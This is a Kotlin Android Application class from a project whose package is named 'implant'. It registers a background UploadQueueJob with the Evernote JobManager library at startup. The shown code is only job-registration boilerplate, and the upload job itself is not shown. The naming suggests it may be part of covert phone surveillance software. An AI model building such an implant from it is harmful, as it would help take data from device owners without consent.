package com.cooperthecoder.implant

import android.app.Application
import com.cooperthecoder.implant.command.UploadQueueJob
import com.evernote.android.job.JobManager

class App : Application() {

    companion object {
        lateinit var instance: App
    }

    override fun onCreate() {
        super.onCreate()
        instance = this
        JobManager.create(this).addJobCreator {
            when (it) {
                UploadQueueJob.JOB_NAME -> {
                    UploadQueueJob()
                }

                else -> {
                    null
                }
            }
        }
    }
}

